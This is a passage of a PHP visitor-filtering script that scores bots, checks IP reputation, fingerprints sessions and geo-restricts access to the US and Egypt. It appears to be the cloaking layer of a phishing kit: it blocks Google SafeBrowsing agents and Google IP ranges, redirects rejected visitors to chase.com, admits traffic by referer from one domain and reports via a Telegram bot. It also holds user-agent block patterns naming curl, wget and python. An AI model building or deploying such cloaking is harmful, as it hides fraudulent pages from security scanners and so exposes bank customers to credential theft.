 * Track shadow rate limiting per IP
 */
function check_shadow_rate_limit($ip) {
    global $config;
    static $rate_limits = [];
    
    // Get rate limit settings from config
    $max_requests = $config['shadow_rate_limit'] ?? 10;
    $window_seconds = $config['shadow_rate_window'] ?? 60;
    $block_duration = $config['shadow_block_duration'] ?? 300; // 5 minutes default
    
    if (!isset($rate_limits[$ip])) {
        $rate_limits[$ip] = [
            'requests' => [],
            'blocked_until' => 0
        ];
    }
    
    $now = time();
    
    // Check if currently blocked
    if ($rate_limits[$ip]['blocked_until'] > $now) {
        return false; // Rate limited
    }
    
    // Clean old requests (older than window)
    $rate_limits[$ip]['requests'] = array_filter(
        $rate_limits[$ip]['requests'],
        function($timestamp) use ($now, $window_seconds) { 
            return ($now - $timestamp) < $window_seconds; 
        }
    );
    
    // Add current request
    $rate_limits[$ip]['requests'][] = $now;
    
    // Check if exceeded limit
    if (count($rate_limits[$ip]['requests']) > $max_requests) {
        // Block for configured duration
        $rate_limits[$ip]['blocked_until'] = $now + $block_duration;
        return false;
    }
    
    return true; // Not rate limited
}

/**
 * Apply shadow enforcement to detected bot
 * PHILOSOPHY: Provide correct-looking but meaningless responses
 * Non-uniform delays, light throttling, NO phantom pages/fake elements
 * Objective: Poison ML without harming UX for humans
 */
function apply_shadow_enforcement($ip, $bot_score, $config) {
    // Check shadow mode configuration
    $shadow_mode = $config['shadow_mode'] ?? 'shadow';
    
    if ($shadow_mode === 'monitor') {
        // Monitor only - don't enforce
        return null;
    }
    
    if ($shadow_mode === 'block') {
        // Hard block - redirect immediately
        return 'block';
    }
    
    // Shadow mode - apply various tactics
    $tactics = $config['shadow_tactics'] ?? [];
    
    // Silent rate limiting
    if ($tactics['silent_rate_limit'] ?? false) {
        if (!check_shadow_rate_limit($ip)) {
            // Apply non-uniform delay (prevents learning patterns)
            if ($tactics['non_uniform_delays'] ?? true) {
                // Vary delay based on request count to prevent pattern detection
                $base_delay = rand(1500, 3500);
                $jitter = rand(-500, 500); // Add jitter
                $delay_ms = max(1000, $base_delay + $jitter);
            } else {
                $delay_ms = rand(2000, 5000);
            }
            usleep($delay_ms * 1000);
        }
    }
    
    // Apply light throttling with non-uniform delays
    if ($tactics['light_throttling'] ?? true) {
        // Gradually increase delay based on bot score
        $throttle_factor = ($bot_score - 50) / 50; // 0-1 range for scores 50-100
        $throttle_factor = max(0, min(1, $throttle_factor));
        
        if ($throttle_factor > 0) {
            $base_delay = $tactics['response_delay_min'] ?? 2000;
            $max_delay = $tactics['response_delay_max'] ?? 5000;
            $throttle_delay = $base_delay + ($throttle_factor * ($max_delay - $base_delay));
            
            // Add non-uniform jitter (prevents ML from learning the pattern)
            if ($tactics['non_uniform_delays'] ?? true) {
                $jitter = rand(-300, 300);
                $throttle_delay += $jitter;
            }
            
            usleep(max(0, $throttle_delay) * 1000);
        }
    }
    
    // Response delay with non-uniform timing
    if (isset($tactics['response_delay_min']) && isset($tactics['response_delay_max'])) {
        if ($tactics['non_uniform_delays'] ?? true) {
            // Non-uniform delays: harder to reverse engineer
            $min = $tactics['response_delay_min'];
            $max = $tactics['response_delay_max'];
            $base_delay = rand($min, $max);
            
            // Add time-based variance (changes behavior over time)
            $time_variance = (time() % 10) * 100; // 0-900ms variance based on time
            $delay_ms = $base_delay + $time_variance;
        } else {
            $delay_ms = rand($tactics['response_delay_min'], $tactics['response_delay_max']);
        }
        usleep($delay_ms * 1000);
    }
    
    // Determine shadow tactic based on bot score
    if ($bot_score >= 80) {
        // Very high confidence bot - apply strongest shadow tactics
        return 'shadow_harsh';
    } elseif ($bot_score >= 60) {
        // Likely bot - apply moderate shadow tactics
        return 'shadow_moderate';
    }
    
    return 'shadow_light';
}

/**
 * Generate fake success response for shadow enforcement
 * Correct-looking but meaningless data to poison ML training
 * NO phantom pages or fake elements per requirements
 */
function generate_fake_success_response($tactic_level) {
    switch ($tactic_level) {
        case 'shadow_harsh':
            // Return completely fake but correct-looking data
            // Poison ML: looks valid, trains model incorrectly
            return [
                'success' => true,
                'message' => 'Request processed successfully',
                'data' => [
                    'id' => 'fake_' . uniqid(),
                    'status' => 'completed',
                    'timestamp' => time(),
                    'items' => [], // Empty results (meaningless)
                    'total' => 0,
                    'metadata' => [
                        'processed' => true,
                        'valid' => true,
                        'checksum' => hash('sha256', 'meaningless_' . time())
                    ]
                ]
            ];
            
        case 'shadow_moderate':
            // Return incomplete/truncated data (light degradation)
            // Poison ML: partial data trains model poorly
            return [
                'success' => true,
                'message' => 'Partial results available',
                'data' => [
                    'id' => 'partial_' . uniqid(),
                    'status' => 'processing', // Perpetual processing state
                    'progress' => rand(10, 90), // Random progress (never completes)
                    'estimated_time' => rand(30, 300), // Fake ETA
                    'items' => array_fill(0, rand(1, 3), ['id' => 'fake_item', 'data' => null])
                ]
            ];
            
        case 'shadow_light':
            // Subtle degradation (queue/pending state)
            // Poison ML: trains on delayed responses
            return [
                'success' => true,
                'message' => 'Request queued for processing',
                'data' => [
                    'id' => 'queued_' . uniqid(),
                    'status' => 'pending',
                    'queue_position' => rand(10, 100),
                    'estimated_time' => rand(300, 3600) // Random long delay
                ]
            ];
            
        default:
            return ['success' => true];
    }
}

$config = require __DIR__ . '/config.php';

$LOG_FILE                   = $config['log_file'];
$BLACKLIST_THRESHOLD        = $config['blacklist_threshold'];
$PROXYCHECK_RISK_THRESHOLD  = $config['proxycheck_risk_threshold'];
$NEUTRINO_USER_ID           = $config['user_id'];
$NEUTRINO_API_KEY           = $config['api_key'];
$PROXYCHECK_KEY             = $config['proxycheck_key'];
$TG_BOT_TOKEN               = $config['tg_bot_token'];
$TG_CHAT_ID                 = $config['tg_chat_id'];

define('BLOCKED_IPS_FILE', __DIR__ . '/blocked_ips.json');

date_default_timezone_set('Africa/Cairo');

function get_whitelisted_ips() {
    return [
        '127.0.0.1',
        '156.217.174.222',
    ];
}

function load_blocked_ips() {
    if (!file_exists(BLOCKED_IPS_FILE)) {
        file_put_contents(BLOCKED_IPS_FILE, json_encode([], JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
    $content = file_get_contents(BLOCKED_IPS_FILE);
    $array   = json_decode($content, true);
    return is_array($array) ? $array : [];
}

function add_to_blocked_ips($ip) {
    $whitelist = get_whitelisted_ips();
    if (in_array($ip, $whitelist, true)) {
        return;
    }

    $blocked = load_blocked_ips();
    if (!in_array($ip, $blocked, true)) {
        $blocked[] = $ip;
        file_put_contents(BLOCKED_IPS_FILE, json_encode($blocked, JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
}

function send_telegram($text){
    global $TG_BOT_TOKEN, $TG_CHAT_ID;
    if (empty($TG_BOT_TOKEN) || empty($TG_CHAT_ID)) {
        return;
    }
    $url     = "https://api.telegram.org/bot{$TG_BOT_TOKEN}/sendMessage";
    $payload = [
        'chat_id'    => $TG_CHAT_ID,
        'parse_mode' => 'Markdown',
        'text'       => $text,
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT_MS, 500);
    curl_exec($ch);
    curl_close($ch);
}

function is_bot_request($ua){
    if (strlen($ua) < 10) {
        return true;
    }
    return preg_match(
        '/(bot|crawler|spider|crawl|bingbot|googlebot|slurp|baiduspider|yandexbot|duckduckbot|chatgpt|copilot|gptbot|uptimerobot|newrelic|statuscake|pingdom|curl|wget|python|php|httpclient|libwww-perl)/i',
        $ua
    );
}

function check_ip_reputation($ip){
    global $NEUTRINO_USER_ID, $NEUTRINO_API_KEY;
    $url = "https://neutrinoapi.net/host-reputation?" . http_build_query([
        "user-id" => $NEUTRINO_USER_ID,
        "api-key" => $NEUTRINO_API_KEY,
        "host"    => $ip
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code !== 200 || !$resp) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    $data = json_decode($resp, true);
    if (!is_array($data)) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    return [
        "risk-score" => intval($data["risk-score"] ?? 0),
        "lists"      => is_array($data["lists"]) ? $data["lists"] : [],
        "is-proxy"   => !empty($data["is-proxy"]),
        "is-vpn"     => !empty($data["is-vpn"]),
        "is-bot"     => !empty($data["is-bot"])
    ];
}

function check_proxycheck($ip){
    global $PROXYCHECK_KEY;
    $url = "https://proxycheck.io/v2/{$ip}?" . http_build_query([
        "key"  => $PROXYCHECK_KEY,
        "vpn"  => 1,
        "risk" => 1
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    curl_close($ch);
    $data = @json_decode($resp, true) ?: [];
    if (!isset($data[$ip])) {
        return ["proxy" => false, "type" => "", "risk" => 0];
    }
    return [
        "proxy" => ($data[$ip]["proxy"] ?? "") === "yes",
        "type"  => $data[$ip]["type"]  ?? "",
        "risk"  => intval($data[$ip]["risk"] ?? 0)
    ];
}

function block_and_exit($client_ip, $user_agent, $reason) {
    global $LOG_FILE;
    add_to_blocked_ips($client_ip);
    $line = date("Y-m-d H:i:s")
          . " | REDIRECTED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | Reason: {$reason}\n";
    file_put_contents($LOG_FILE, $line, FILE_APPEND);
    if (!headers_sent()) {
        header("Location: https://www.chase.com");
        exit;
    }
}

$client_ip  = get_client_ip();
$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "";

// Session-network binding verification for returning visitors
if (isset($_COOKIE['fp_hash']) && isset($_COOKIE['js_verified'])) {
    // Apply silent session aging mechanism
    $aging_action = apply_silent_aging($client_ip, $config);
    
    if ($aging_action === 'delay') {
        // Trust too low, apply response delays and quality reduction
        // This exhausts bots without affecting humans significantly
        
        // Log aging action
        file_put_contents($LOG_FILE ?? __DIR__ . '/logs/antibot.log', 
            date("Y-m-d H:i:s") . " | SILENT_AGING_DELAY | IP: {$client_ip} | Reason: Low trust, renewal failed\n", 
            FILE_APPEND);
        
        // Quality reduction: Show slower loading but allow manual continue
        // NO CAPTCHA and NO automatic refresh to prevent infinite loops
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Loading...</title>
            <style>
                body {
                    margin: 0;
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: #f5f5f5;
                }
                .loader {
                    text-align: center;
                }
                .spinner {
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #3498db;
                    border-radius: 50%;
                    width: 40px;
                    height: 40px;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 20px;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .continue-btn {
                    margin-top: 20px;
                    padding: 10px 20px;
                    background: #3498db;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    text-decoration: none;
                    display: inline-block;
                }
                .continue-btn:hover {
                    background: #2980b9;
                }
            </style>
        </head>
        <body>
            <div class="loader">
                <div class="spinner"></div>
                <p>Verifying your session...</p>
                <a href="<?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?>" class="continue-btn">Continue</a>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
    
    // Verify session-network binding
    $binding_valid = verify_session_binding($client_ip, $_COOKIE['fp_hash']);
    
    // Check if session needs re-evaluation due to aging or behavioral deviation
    $needs_reeval = needs_reevaluation($client_ip, $config);
    
    if ($needs_reeval) {
        // Session trust too low or behavioral deviation detected
        force_session_reverification($client_ip);
        
        // Log re-evaluation trigger
        file_put_contents($LOG_FILE ?? __DIR__ . '/logs/antibot.log', 
            date("Y-m-d H:i:s") . " | SESSION_REEVALUATION | IP: {$client_ip} | Reason: Session aging or behavioral deviation\n", 
            FILE_APPEND);
        
        // Continue to verification flow (don't exit, allow re-verification)
    } elseif (!$binding_valid) {
        // Network changed or session binding failed
        // Log suspicious activity but don't immediately clear cookies
        file_put_contents($LOG_FILE ?? __DIR__ . '/logs/antibot.log', 
            date("Y-m-d H:i:s") . " | SESSION_BINDING_WARNING | IP: {$client_ip} | Reason: Network context may have changed\n", 
            FILE_APPEND);
        
        // Only clear cookies if binding fails multiple times (track failed attempts)
        $failed_binding_key = 'antibot_binding_fails_' . $client_ip;
        $failed_attempts = intval($_COOKIE[$failed_binding_key] ?? 0);
        $failed_attempts++;
        
        if ($failed_attempts >= 3) {
            // After 3 failed binding checks, force re-verification
            setcookie('fp_hash', '', time() - 3600, '/');
            setcookie('js_verified', '', time() - 3600, '/');
            setcookie('analysis_done', '', time() - 3600, '/');
            setcookie($failed_binding_key, '', time() - 3600, '/');
            
            file_put_contents($LOG_FILE ?? __DIR__ . '/logs/antibot.log', 
                date("Y-m-d H:i:s") . " | SESSION_BINDING_FAILED | IP: {$client_ip} | Reason: Multiple binding failures\n", 
                FILE_APPEND);
        } else {
            // Track failed attempt but allow passage
            setcookie($failed_binding_key, strval($failed_attempts), time() + 1800, '/'); // 30 min expiry
            // Allow user to continue without re-verification
            return;
        }
    } else {
        // Binding check passed, reset failed attempts counter if exists
        if (isset($_COOKIE[$failed_binding_key])) {
            setcookie('antibot_binding_fails_' . $client_ip, '', time() - 3600, '/');
        }
        // User is verified and binding is valid, allow passage
        return;
    }
}

if (is_bot_from_github_list($user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Detected from GitHub Bot List');
}

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$origin  = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowed_sources = [
    'https://gotoschooleg.com',
    'https://www.gotoschooleg.com',
];
foreach ($allowed_sources as $src) {
    if (stripos($referer, $src) !== false || stripos($origin, $src) !== false) {
        return false;
    }
}

if (preg_match('/google.*safebrowsing|googleinspectiontool/i', $user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Blocked Google SafeBrowsing');
}

$google_ranges = ['64.233.', '66.102.', '66.249.', '108.177.', '209.85.', '216.239.'];
foreach ($google_ranges as $prefix) {
    if (str_starts_with($client_ip, $prefix)) {
        block_and_exit($client_ip, $user_agent, 'Blocked Google IP Range');
    }
}
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$client_ip}?fields=countryCode"), true);
$allowed_countries = ['US', 'EG'];
if (!isset($geo['countryCode']) || !in_array($geo['countryCode'], $allowed_countries)) {
    block_and_exit($client_ip, $user_agent, "Country Not Allowed: " . ($geo['countryCode'] ?? 'Unknown'));
}

$blocked_list = load_blocked_ips();
if (in_array($client_ip, $blocked_list, true)) {
    block_and_exit($client_ip, $user_agent, "Previously Blocked IP");
}

if (!file_exists($LOG_FILE)) {
    file_put_contents($LOG_FILE, "");
    @chmod($LOG_FILE, 0644);
}
file_put_contents($LOG_FILE, date("Y-m-d H:i:s") . " | anitbot.php RUNNING | IP: {$client_ip}\n", FILE_APPEND);

if (empty($user_agent) || preg_match('/^(curl|wget|python|libwww-perl|httpclient|php)/i', $user_agent)) {
    $reason = empty($user_agent) ? "Empty UA" : "Suspicious UA";
    block_and_exit($client_ip, $user_agent, $reason);
}
if (is_bot_request($user_agent)) {
    $reason = "UA Bot";
    block_and_exit($client_ip, $user_agent, $reason);
}

function is_bot_from_github_list(string $ua): bool {
    static $bot_patterns = null;
    if ($bot_patterns === null) {
        $file = __DIR__ . '/crawler-user-agents.json';
        if (!file_exists($file)) return false;
        $json = file_get_contents($file);
        $data = json_decode($json, true);
        if (!is_array($data)) return false;
        $bot_patterns = array_column($data, 'pattern');
    }
    foreach ($bot_patterns as $pattern) {
        if (@preg_match("/$pattern/i", $ua)) {
            return true;
        }
    }
    return false;
}

function is_advanced_bot($ip, $ua) {
    if (isset($_COOKIE['js_verified']) && $_COOKIE['js_verified'] === 'yes') {
        return false;
    }
    
    // 1. Headless browser detection
    if (preg_match('/HeadlessChrome|Puppeteer|Playwright|PhantomJS/i', $ua)) {
        return 'Headless browser';
    }
    
    // 2. Selenium/WebDriver detection
    if (preg_match('/selenium|webdriver|bot|crawler|spider/i', $ua)) {
        return 'Selenium/WebDriver detected';
    }
    
    // 3. Check for automation headers
    $automation_headers = [
        'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest',
        'HTTP_X_AUTOMATION' => true,
        'HTTP_CHROME_AUTOMATION' => true
    ];
    
    foreach ($automation_headers as $header => $value) {
        if (isset($_SERVER[$header])) {
            if ($value === true || $_SERVER[$header] === $value) {
                return 'Automation headers detected';
            }
        }
    }
    
    // 4. Fake Chrome UA without proper headers
    if (stripos($ua, 'Chrome') !== false && (
        empty($_SERVER['HTTP_SEC_CH_UA']) ||
        empty($_SERVER['HTTP_SEC_FETCH_SITE'])
    )) {
        return 'Fake Chrome UA';
    }
    
    // 5. Missing Accept-Language (common in bots)
    if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        return 'Missing Accept-Language header';
    }
    
    // 6. Suspicious Accept-Language values
    $accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
    if ($accept_lang === 'en-US' || $accept_lang === 'en') {
        // Too simple - real browsers send more complex Accept-Language
        return 'Suspicious Accept-Language';
    }
    
    // 7. Check for CDP (Chrome DevTools Protocol) indicators in headers
    if (!empty($_SERVER['HTTP_USER_AGENT']) && 
        strpos($_SERVER['HTTP_USER_AGENT'], 'HeadlessChrome') !== false) {
        return 'CDP/HeadlessChrome detected';
    }
    
    // 8. Check for missing or suspicious connection headers
    if (empty($_SERVER['HTTP_CONNECTION'])) {
        return 'Missing Connection header';
    }
    
    // 9. Bot IP ranges (Google, Microsoft, etc.)
    $known_ranges = ['64.233.', '66.102.', '66.249.', '157.55.', '167.89.'];
    foreach ($known_ranges as $prefix) {
        if (str_starts_with($ip, $prefix)) {
            return 'Bot IP Range';
        }
    }
    
    // 10. Check for too-fast requests (< 100ms between requests)
    static $last_request_time = [];
    $current_time = microtime(true);
    if (isset($last_request_time[$ip])) {
        $time_diff = ($current_time - $last_request_time[$ip]) * 1000; // Convert to ms
        if ($time_diff < 100) {
            return 'Too-fast requests (bot-like)';
        }
    }
    $last_request_time[$ip] = $current_time;
    
    return false;
}

$rez        = check_ip_reputation($client_ip);
$risk_score = $rez["risk-score"];
$lists      = $rez["lists"];
$is_proxy   = $rez["is-proxy"];
$is_vpn     = $rez["is-vpn"];
$is_neu_bot = $rez["is-bot"];
$listedCount = 0;
foreach ($lists as $entry) {
    if (!empty($entry["is-listed"])) {
        $listedCount++;
    }
}
$pc              = check_proxycheck($client_ip);
$proxycheckProxy = $pc["proxy"];
$proxycheckType  = $pc["type"];
$proxycheckRisk  = $pc["risk"];

if ($is_proxy || $is_vpn || ($proxycheckProxy && $proxycheckRisk >= $PROXYCHECK_RISK_THRESHOLD)) {
    $reason = "VPN/Proxy Detected";
    block_and_exit($client_ip, $user_agent, $reason);
}
if ($risk_score >= 30 || $listedCount >= $BLACKLIST_THRESHOLD) {
    $reason = "High Risk ({$risk_score}) or ListedCount ({$listedCount})";
    block_and_exit($client_ip, $user_agent, $reason);
}
$log_line = date("Y-m-d H:i:s")
          . " | ALLOWED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | NeutrinoRisk: {$risk_score}"
          . " | NeutrinoProxy: " . ($is_proxy ? "Y" : "N")
          . " | NeutrinoVPN: "   . ($is_vpn   ? "Y" : "N")
          . " | NeutrinoBot: "   . ($is_neu_bot ? "Y":"N")
          . " | ListedCount: {$listedCount}"
          . " | ProxyCheckProxy: " . ($proxycheckProxy?"Y":"N")
          . " | ProxyCheckType: {$proxycheckType}"
          . " | ProxyCheckRisk: {$proxycheckRisk}"
          . "\n";
file_put_contents($LOG_FILE, $log_line, FILE_APPEND);

// -------------------------------------------------
// CAPTCHA واجهة التحقق Cloudflare-style checkbox كبيرة على الهاتف
// Enhanced with behavioral analysis for better bot detection
// -------------------------------------------------

// Check if this is first visit (no analysis done yet)
$is_first_visit = !isset($_COOKIE['js_verified']) && !isset($_COOKIE['fp_hash']) && !isset($_COOKIE['analysis_done']);

if ($is_first_visit) {
    // First visit: Show analysis page to collect behavioral data
    // Set cookie WITHOUT httponly so JavaScript can verify it was set
    setcookie('analysis_done', 'yes', time() + 86400, '/');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <title>Security Check</title>
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <style>
        body {
          margin: 0;
          padding: 0;
          height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          background: #f8f9fa;
          font-family: "Segoe UI", Tahoma, Arial, sans-serif;
        }
        .analysis-container {
          text-align: center;
          padding: 40px;
        }
        .spinner {
          width: 50px;
          height: 50px;
          margin: 0 auto 20px;
          border: 4px solid #e0e0e0;
          border-top: 4px solid #007bff;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .message {
          font-size: 18px;
          color: #333;
          margin-bottom: 10px;
        }
        .submessage {
          font-size: 14px;
          color: #666;
        }
      </style>
    </head>
    <body>
      <div class="analysis-container">
        <div class="spinner"></div>
        <div class="message">Checking your connection security...</div>
        <div class="submessage">This will only take a moment</div>
      </div>
      <!-- Include behavioral tracking script -->
      <script src="antibot-tracking.js"></script>
      <script>
        // Store original URL
        try {
          localStorage.setItem("antibot_redirect", <?php echo json_encode($_SERVER['REQUEST_URI']); ?>);
        } catch(e) {}
        
        // Function to check if enough behavioral data has been collected
        function checkBehavioralData() {
          // Check if tracker has collected sufficient actions
          if (window.behaviorTracker) {
            const sessionData = window.behaviorTracker.getSessionData ? window.behaviorTracker.getSessionData() : null;
            if (sessionData && sessionData.actions && sessionData.actions.length >= 3) {
              return true; // Sufficient data
            }
          }
          return false;
        }
        
        // Wait for behavioral data collection with dynamic timing
        let attempts = 0;
        const maxAttempts = 10; // Maximum 5 seconds (10 * 500ms)
        
        const checkInterval = setInterval(async function() {
          attempts++;
          
          // Check if we have enough data OR reached timeout
          if (checkBehavioralData() || attempts >= maxAttempts) {
            clearInterval(checkInterval);
            
            // Send data
            if (window.behaviorTracker && typeof window.behaviorTracker.sendToServer === 'function') {
              window.behaviorTracker.sendToServer();
              // Wait for sendBeacon to complete
              await new Promise(resolve => setTimeout(resolve, 300));
            }
            
            // Verify cookie was set before reloading
            const cookieSet = document.cookie.indexOf('analysis_done=yes') !== -1;
            if (!cookieSet) {
              // Cookie not set, manually add it
              document.cookie = 'analysis_done=yes; path=/; max-age=86400';
            }
            
            // After data is sent, navigate to same URL to trigger analysis
            window.location.href = window.location.href;
          }
        }, 500); // Check every 500ms
      </script>
    </body>
    </html>
    <?php
    exit;
}

// Calculate bot confidence after initial analysis period (only if analysis_done cookie exists)
if (isset($_COOKIE['analysis_done']) && !isset($_COOKIE['js_verified'], $_COOKIE['fp_hash'])) {
    // Check if we have sufficient behavioral data before analyzing
    $behavior_data = load_behavior_data();
    $ip_data = $behavior_data[$client_ip] ?? [];
    $has_sufficient_data = false;
    
    // We need at least some actions recorded to make a decision
    if (isset($ip_data['sessions']) && !empty($ip_data['sessions'])) {
        $total_actions = 0;
        foreach ($ip_data['sessions'] as $session) {
            if (isset($session['actions'])) {
                $total_actions += count($session['actions']);
            }
        }
        // Require at least 3 actions to have meaningful data
        $has_sufficient_data = $total_actions >= 3;
    }
    
    // If insufficient data, assume human and let them through
    // Only show verification for users who are actually flagged as suspicious
    if (!$has_sufficient_data) {
        // Generate dynamic fingerprint for this session
        $dynamic_fp = generate_dynamic_fingerprint($client_ip);
        save_fingerprint($client_ip, $dynamic_fp);
        
        // Assume human - set cookies and allow access
        setcookie('js_verified', 'yes', time() + 86400, '/');
        setcookie('fp_hash', $dynamic_fp, time() + 86400, '/');
        
        // Log as human with insufficient data
        $characteristics = ['note' => 'First-time visitor, insufficient data - assumed human'];
        log_access_attempt($client_ip, 'human', 0, ['is_confident_human' => true, 'reasons' => ['Insufficient data, assumed human']], $characteristics);
        
        // Allow the page to continue loading - no verification needed
        $bot_analysis = null; // Skip further analysis
    } else {
        // We have sufficient data, perform analysis
        $bot_analysis = calculate_bot_confidence($client_ip);
    }
    
    // Extract bot characteristics for logging
    $characteristics = $characteristics ?? [];
    
    // Only extract detailed characteristics if we have sufficient data
    if (isset($ip_data['sessions']) && $has_sufficient_data) {
        $sessions = $ip_data['sessions'];
        $characteristics['sessions'] = count($sessions);
        
        // Analyze timing patterns
        $all_actions = [];
        foreach ($sessions as $session) {
            if (isset($session['actions'])) {
                $all_actions = array_merge($all_actions, $session['actions']);
            }
        }
        
        if (count($all_actions) > 1) {
            $intervals = [];
            for ($i = 1; $i < count($all_actions); $i++) {
                $intervals[] = $all_actions[$i]['timestamp'] - $all_actions[$i-1]['timestamp'];
            }
            if (!empty($intervals)) {
                $avg_interval = array_sum($intervals) / count($intervals);
                $characteristics['timing_pattern'] = $avg_interval < 100 ? 
                    "Perfect {$avg_interval}ms intervals (mathematical precision)" : 
                    "Variable timing (human-like)";
            }
        }
        
        // Error rate
        $errors = 0;
        foreach ($sessions as $session) {
            if (isset($session['actions'])) {
                foreach ($session['actions'] as $action) {
                    if ($action['type'] === 'input_correction' || $action['type'] === 'click_cancel') {
                        $errors++;
                    }
                }
            }
        }
        $characteristics['error_rate'] = count($all_actions) > 0 ? round(($errors / count($all_actions)) * 100, 1) : 0;
        $characteristics['error_rate'] .= $errors === 0 ? '% (no human mistakes)' : '% (natural errors)';
        
        // UI interaction
        $decorative_clicks = 0;
        $functional_clicks = 0;
        foreach ($sessions as $session) {
            if (isset($session['actions'])) {
                foreach ($session['actions'] as $action) {
                    if ($action['type'] === 'click') {
                        if (isset($action['target_type']) && $action['target_type'] === 'decorative') {
                            $decorative_clicks++;
                        } else {
                            $functional_clicks++;
                        }
                    }
                }
            }
        }
        $characteristics['ui_interaction'] = $decorative_clicks === 0 && $functional_clicks > 0 ? 
            'Ignores ALL decorative elements' : 
            'Natural interaction with UI';
        
        // Session gaps
        if (count($sessions) > 1) {
            $gaps = [];
            for ($i = 1; $i < count($sessions); $i++) {
                $gap = $sessions[$i]['start_time'] - $sessions[$i-1]['end_time'];
                $gaps[] = $gap;
            }
            $avg_gap = array_sum($gaps) / count($gaps);
            $characteristics['session_gaps'] = $avg_gap < 3 ? 
                "< 3 seconds (inhuman speed)" : 
                ">= 3 seconds (normal)";
        }
    }
    
    // Only continue with analysis if we have bot_analysis data
    if ($bot_analysis !== null) {
        // Handle likely bots with shadow enforcement
        if ($bot_analysis['is_likely_bot']) {
            $reason = 'Behavioral Analysis: ' . implode(', ', $bot_analysis['reasons']);
        
        // Log to admin dashboard (hashed for security)
        log_access_attempt($client_ip, 'bot', $bot_analysis['confidence'], $bot_analysis, $characteristics);
        
        // Apply shadow enforcement instead of immediate block
        $shadow_action = apply_shadow_enforcement($client_ip, $bot_analysis['confidence'], $config);
        
        if ($shadow_action === 'block') {
            // Hard block mode - immediate redirect
            file_put_contents($LOG_FILE, date("Y-m-d H:i:s") . " | BLOCKED | IP: {$client_ip} | Reason: {$reason}\n", FILE_APPEND);
            header("Location: https://www.google.com");
            exit;
        } elseif ($shadow_action && strpos($shadow_action, 'shadow_') === 0) {
            // Shadow enforcement - show fake success or slow down bot
            
            // For page requests, show a fake loading page that never completes
            ?>
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Loading...</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        background: #f8f9fa;
                        font-family: "Segoe UI", Arial, sans-serif;
                    }
                    .container {
                        text-align: center;
                        padding: 40px;
                    }
                    .spinner {
                        width: 50px;
                        height: 50px;
                        margin: 0 auto 20px;
                        border: 4px solid #e0e0e0;
                        border-top: 4px solid #007bff;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                    .message {
                        font-size: 18px;
                        color: #333;
                        margin-bottom: 10px;
                    }
                    .submessage {
                        font-size: 14px;
                        color: #666;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="spinner"></div>
                    <div class="message">Processing your request...</div>
                    <div class="submessage">Please wait while we verify your connection</div>
                </div>
                <script>
                    // Fake progress that never completes
                    let progress = 0;
                    setInterval(() => {
                        progress += Math.random() * 2;
                        if (progress > 98) progress = 98; // Never reach 100%
                        console.log('Loading: ' + Math.floor(progress) + '%');
                    }, <?php echo rand(2000, 5000); ?>);
                    
                    // Occasionally show fake "success" but don't redirect
                    setTimeout(() => {
                        document.querySelector('.message').textContent = 'Almost there...';
                    }, <?php echo rand(30000, 60000); ?>);
                </script>
            </body>
            </html>
            <?php
            exit;
        }
    }
    
    // Seamless access for confident humans - set cookies and allow entry
    if ($bot_analysis['is_confident_human']) {
        // Generate dynamic fingerprint with session-network binding
        $dynamic_fp = generate_dynamic_fingerprint($client_ip);
        save_fingerprint($client_ip, $dynamic_fp);
        
        setcookie('js_verified', 'yes', time() + 86400, '/');
        setcookie('fp_hash', $dynamic_fp, time() + 86400, '/');
        // Log to admin dashboard
